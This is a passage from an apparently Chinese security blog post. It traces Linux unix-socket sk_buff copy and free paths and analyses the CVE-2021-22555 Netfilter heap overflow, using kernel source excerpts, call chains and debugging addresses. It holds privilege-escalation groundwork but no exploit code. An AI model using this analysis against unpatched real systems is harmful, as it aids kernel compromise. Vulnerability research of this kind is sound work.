class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_read_generic</span><span class="params">(struct unix_stream_read_state *state,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">bool</span> freezable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		chunk = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, unix_skb_len(skb) - skip, size);</span><br><span class="line">		skb_get(skb);</span><br><span class="line">        <span class="comment">//------------------分叉一:数据复制</span></span><br><span class="line">        <span class="comment">//recv_actor函数指针是在unix_stream_recvmsg函数中定义的state函数表</span></span><br><span class="line">        <span class="comment">//该函数指针对应unix_stream_read_actor函数,即从这开始进行数据复制</span></span><br><span class="line">		chunk = state-&gt;recv_actor(skb, skip, chunk, state);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="comment">//传输数据完成之后,skb-&gt;users从2改为1,表示已经复制完数据了,方便后续判断</span></span><br><span class="line">        <span class="comment">//消息中是否还有数据</span></span><br><span class="line">		consume_skb(skb);</span><br><span class="line">		<span class="keyword">if</span> (chunk &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (copied == <span class="number">0</span>)</span><br><span class="line">				copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		copied += chunk;</span><br><span class="line">		size -= chunk;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Mark read part of skb as used */</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; MSG_PEEK)) &#123;</span><br><span class="line">            <span class="comment">//修改skb类型转换之后对应的consumed字段,其实就是skb-&gt;cb某个位置处的数据</span></span><br><span class="line">            <span class="comment">//#define UNIXCB(skb)	(*(struct unix_skb_parms *)&amp;((skb)-&gt;cb))</span></span><br><span class="line">			UNIXCB(skb).consumed += chunk;</span><br><span class="line">			<span class="comment">//依据上面的consumed和len来判断消息中是否还剩下没有传输的数据</span></span><br><span class="line">            <span class="comment">//有(1)则break,无(0)则进入后续的内存释放阶段</span></span><br><span class="line">			<span class="keyword">if</span> (unix_skb_len(skb))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//------------------------分叉二:内存释放</span></span><br><span class="line">            <span class="comment">//内存释放前置工作</span></span><br><span class="line">			skb_unlink(skb, &amp;sk-&gt;sk_receive_queue);</span><br><span class="line">            <span class="comment">//进入该函数,通过对于skb-&gt;users的判断之后,进入内存释放阶段</span></span><br><span class="line">			consume_skb(skb);</span><br><span class="line">            <span class="comment">//....................</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (size);</span><br><span class="line">        <span class="comment">//......................</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> copied ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-数据复制"   >
          <a href="#A-数据复制" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-数据复制" class="headerlink" title="A.数据复制"></a>A.数据复制</h5>
      <p>之后的函数调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_stream_read_actor() -&gt; skb_copy_datagram_msg() -&gt; skb_copy_datagram_iter() -&gt; __skb_datagram_iter()</span><br></pre></td></tr></table></div></figure>

<p>最终进入<code>__skb_datagram_iter</code>，</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __skb_datagram_iter(<span class="keyword">const</span> struct sk_buff *skb, <span class="keyword">int</span> offset,</span><br><span class="line">			       struct iov_iter *to, <span class="keyword">int</span> len, <span class="keyword">bool</span> fault_short,</span><br><span class="line">			       <span class="keyword">size_t</span> (*cb)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">void</span> *,</span><br><span class="line">					    struct iov_iter *), <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> start = skb_headlen(skb);</span><br><span class="line">	<span class="keyword">int</span> i, copy = start - offset, start_off = offset, n;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy header. */</span></span><br><span class="line">    <span class="comment">//这个header指的就是数据data,大概就是从这里开始实际的数据</span></span><br><span class="line">	<span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">			copy = len;</span><br><span class="line">		n = INDIRECT_CALL_1(cb, simple_copy_to_iter,</span><br><span class="line">				    skb-&gt;data + offset, copy, data, to);</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (n != copy)</span><br><span class="line">			<span class="keyword">goto</span> short_copy;</span><br><span class="line">		<span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">/* Copy paged appendix. Hmm... why does this look so complicated? */</span></span><br><span class="line">    <span class="comment">//linux内核维护人员都看不下去了,xs</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里使用了感觉很复杂的机制，不是很懂。</p>

        <h5 id="B-内存释放"   >
          <a href="#B-内存释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-内存释放" class="headerlink" title="B.内存释放"></a>B.内存释放</h5>
      <p>进入内存释放的函数调用链为</p>
<ul>
<li><p>释放<code>skb-&gt;data</code>部分：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;skb_release_all()-&gt;skb_release_all()-&gt;skb_release_data()-&gt;skb_free_head()</span><br></pre></td></tr></table></div></figure>

<p>对应函数如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_free_head</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//其实head和data是一样的</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *head = skb-&gt;head;</span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		skb_free_frag(head);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		kfree(head);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到使用的正常的<code>kfree</code>函数</p>
</li>
<li><p>释放<code>skb</code>部分：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;kfree_skbmem()</span><br></pre></td></tr></table></div></figure>

<p>相关函数如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kfree_skbmem</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line">    <span class="comment">//克隆体相关的,没有fork之类的话一般不用太管的</span></span><br><span class="line">    <span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">            <span class="comment">//用专门的cache(skbuff_head_cache)进行回收</span></span><br><span class="line">            kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment">		 * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment">		 * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">            <span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">goto</span> fastpath;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">    <span class="comment">//用专门的cache(skbuff_fclone_cache)进行回收克隆的skb</span></span><br><span class="line">    kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>这个就不太好利用了。</p>
<p>同样的，当关闭的信道的两端，该信道内产生的所有的<code>sk_buff</code>和<code>skb-&gt;data</code>都会得到释放</p>
</li>
</ul>

        <h5 id="内存释放总结："   >
          <a href="#内存释放总结：" class="heading-link"><i class="fas fa-link"></i></a><a href="#内存释放总结：" class="headerlink" title="内存释放总结："></a>内存释放总结：</h5>
      <ul>
<li><p>当从信道中将某条消息全部读取完之后，会发生该条消息对应的<code>sk_buff</code>和<code>skb-&gt;data</code>的内存释放，且<code>sk_buff</code>释放到专门的缓存池中，<code>skb-&gt;data</code>使用正常的<code>kfree</code>释放</p>
</li>
<li><p>当关闭信道两端，该信道内产生的所有的<code>sk_buff</code>和<code>skb-&gt;data</code>都会得到释放，具体的调用链为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close()-&gt;__sock_release()-&gt;unix_release()-&gt;__kfree_skb()</span><br></pre></td></tr></table></div></figure>

<p>后面就类似了。</p>
</li>
</ul>

        <h1 id="一、漏洞分析"   >
          <a href="#一、漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、漏洞分析" class="headerlink" title="一、漏洞分析"></a>一、漏洞分析</h1>
      
        <h2 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
      <p>由于我编译环境的时候老是出问题（后面才解决的），所以直接拿<code>bsauce</code>师傅提供的环境来用了，但是又没有带DEBUG的<code>vmlinux</code>，所以我使用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf.git" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>简单获取下符号就开始逆向了(xs)，所以下面漏洞分析提到的地址为<code>bsauce</code>师傅环境的地址。</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027#h2-1" >CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>相关的<code>Netfilter</code>分析就不做了，也不太会，可以看看<code>bsauce</code>师傅的，这里主要关注数据的传输过程的一些东西。</p>
<p>通过<code>Netfilter</code>的<code>setsockopt</code>系统调用，传入用户数据<code>&amp;data</code>，可依据该<code>&amp;data</code>中的相关数据进行不同大小的堆块申请。完成申请后，还会对该堆块进行一定的处理，其中就有向堆块末尾填充数据的操作。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);</span><br></pre></td></tr></table></div></figure>

<p>其中<code>t-&gt;data+target-&gt;targetsize</code>即为申请的堆块上末尾处的某个地址，<code>pad</code>为如下定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br></pre></td></tr></table></div></figure>

<p>其实<code>pad</code>的值即为<code>8 - (target-&gt;targetsize mod 8)</code>，就是所谓的8字节对齐。</p>
<p>并且<code>t-&gt;data</code>的地址偏移和<code>target-&gt;targetsize</code>的值都可被我们直接或间接地控制，那么就可以存在堆块溢出写0的操作了，这里最多溢出4个字节填充为0。</p>
<p>下面是具体的关键函数调用链和相关分析</p>

        <h2 id="1-nf-setsockopt"   >
          <a href="#1-nf-setsockopt" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-nf-setsockopt" class="headerlink" title="1.nf_setsockopt()"></a>1.nf_setsockopt()</h2>
      <p>句柄定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>这样到调用<code>setsockopt</code>系统调用时，就会调用到<code>do_ipt_get_ctl</code>函数。</p>

        <h2 id="2-do-ipt-set-ctl"   >
          <a href="#2-do-ipt-set-ctl" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-do-ipt-set-ctl" class="headerlink" title="2.do_ipt_set_ctl()"></a>2.do_ipt_set_ctl()</h2>
      <ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct sock *sk, <span class="keyword">int</span> cmd, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure>

<p>调试如下<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220501113945278.png" alt="image-20220501113945278"></p>
<p>这个<code>&amp;data</code>即为用户传入的，赋值给<code>sockptr_t arg</code>，从而依据<code>sockptr_t arg</code>来进行堆块申请和相关的漏洞填充操作。</p>
</li>
<li><p>地址：<code>0xffffffff81b0bd20</code></p>
</li>
<li><p>介绍：该函数由<code>nf_sockopt_ops ipt_sockopts</code>进行句柄定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">....</span><br><span class="line">	.get		= do_ipt_get_ctl,</span><br><span class="line">....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>即系统调用<code>setsockopt</code>实际调用到与漏洞方面有关的最早的函数，传入的<code>sockptr_targ</code>即为用户参数<code>&amp;data</code>，后续会调用到<code>compat_do_replace</code>，传入<code>sockptr_t arg</code></p>
</li>
</ul>

        <h2 id="3-compat-do-replace"   >
          <a href="#3-compat-do-replace" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-compat-do-replace" class="headerlink" title="3.compat_do_replace()"></a>3.compat_do_replace()</h2>
      <p>通过<code>_copy_from_user</code>复制<code>&amp;data</code>的<code>0x5c</code>字节给<code>tmp</code></p>
<ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：<code>0xffffffff81b0baf0</code></p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="keyword">sockptr_t</span> arg;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> <span class="title">tmp</span>;</span><span class="comment">//保存size</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>调用<code>translate_compat_table()</code>，传入本函数定义的<code>tmp</code>作为<code>compatr</code>，该变量<code>tmp</code>由函数<code>copy_from_sockptr(&amp;tmp, arg, sizeof(tmp))</code>进行赋值</p>
<ul>
<li>相关函数链：<code>copy_from_sockptr-&gt;copy_from_sockptr-&gt;copy_from_sockptr_offset-&gt;copy_from_user</code></li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/sockptr.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">copy_from_sockptr_offset</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">sockptr_t</span> src,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!sockptr_is_kernel(src))</span><br><span class="line">		<span class="keyword">return</span> copy_from_user(dst, src.user + offset, size);</span><br><span class="line">	<span class="built_in">memcpy</span>(dst, src.kernel + offset, size);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>dst</code>即为<code>tmp</code>，<code>src</code>即为<code>arg</code>，也就是会依据<code>arg(&amp;data)</code>的内容来给<code>tmp</code>赋值。即最后的<code>compatr</code>的来源为上述提到的<code>sockptr_t arg</code>，也就是用户传入的参数<code>&amp;data</code>。</p>
<p>从<code>&amp;data</code>中复制<code>0x5c(sizeof(struct compat_ipt_replace))</code>大小的给到<code>tmp(compatr)</code>，如下代码所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/ipv4/netfilter/ip_tables.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function">    <span class="title">compat_do_replace</span><span class="params">(struct net *net, <span class="keyword">sockptr_t</span> arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">if</span> (copy_from_sockptr(&amp;tmp, arg, <span class="keyword">sizeof</span>(tmp)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="comment">///....</span></span><br><span class="line">    <span class="comment">//这里的tmp.size即为0xfb6，传入的data.replace.size，也是申请了堆块的。</span></span><br><span class="line">    <span class="comment">//不过这个堆块不用太过关注，但是这个不能随便设置，不然会在如下检查出错误</span></span><br><span class="line">    <span class="comment">//然后跳转out_unlock从而无法进入漏洞点</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //translate_compat_table函数中</span></span><br><span class="line"><span class="comment">    //Walk through entries, checking offsets. </span></span><br><span class="line"><span class="comment">	xt_entry_foreach(iter0, entry0, compatr-&gt;size) &#123;</span></span><br><span class="line"><span class="comment">		ret = check_compat_entry_size_and_hooks(iter0, info, &amp;size,</span></span><br><span class="line"><span class="comment">							entry0,</span></span><br><span class="line"><span class="comment">							entry0 + compatr-&gt;size);</span></span><br><span class="line"><span class="comment">		if (ret != 0)</span></span><br><span class="line"><span class="comment">			goto out_unlock;</span></span><br><span class="line"><span class="comment">		++j;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//需要注意的是这个newinfo和下面函数中的newinfo不是同一个</span></span><br><span class="line">    newinfo = xt_alloc_table_info(tmp.size);</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    ret = translate_compat_table(net, &amp;newinfo, &amp;loc_cpu_entry, &amp;tmp);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>复制的这些数据中就包含定义好的size，用来完成之后的堆块申请。</p>
</li>
</ul>

        <h2 id="4-translate-compat-table"   >
          <a href="#4-translate-compat-table" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-translate-compat-table" class="headerlink" title="4.translate_compat_table()"></a>4.translate_compat_table()</h2>
      <ul>
<li><p>参数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(struct net *net,struct xt_table_info **pinfo,<span class="keyword">void</span> **pentry0,<span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br></pre></td></tr></table></div></figure></li>
<li><p>地址：<code>0xffffffff81b0b3e0</code></p>
</li>
<li><p>介绍：</p>
<ul>
<li><p>主要关注变量：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//传入的</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_replace</span> *<span class="title">compatr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">newinfo</span>;</span></span><br><span class="line"><span class="keyword">void</span> *pos, *entry1;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_ipt_entry</span> *<span class="title">iter0</span>;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p><code>size</code>：<code>size = compatr-&gt;size;</code></p>
</li>
<li><p><code>newinfo</code>：依据<code>size</code>即上述的<code>compatr-&gt;size</code>申请堆块，漏洞点就出在这个申请的堆块上面。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">translate_compat_table(struct net *net,</span><br><span class="line">                       struct xt_table_info **pinfo,</span><br><span class="line">                       <span class="keyword">void</span> **pentry0,</span><br><span class="line">                       <span class="keyword">const</span> struct compat_ipt_replace *compatr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    size = compatr-&gt;size;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//这个堆块就是漏洞堆块了。</span></span><br><span class="line">    newinfo = xt_alloc_table_info(size);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>通过<code>xt_alloc_table_info</code>来申请堆块，其中有如下代码</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /net/netfilter/x_tables.c</span></span><br><span class="line"><span class="function">struct xt_table_info *<span class="title">xt_alloc_table_info</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">size_t</span> sz = <span class="keyword">sizeof</span>(*info) + size;<span class="comment">//加上0x40大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sz &lt; <span class="keyword">sizeof</span>(*info) || sz &gt;= XT_MAX_TABLE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//实际申请的堆块大小为0xffe,即kmalloc-4096，这个堆块就是漏洞堆块了。</span></span><br><span class="line">    <span class="comment">//结构为struct xt_table_info</span></span><br><span class="line">	info = kvmalloc(sz, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	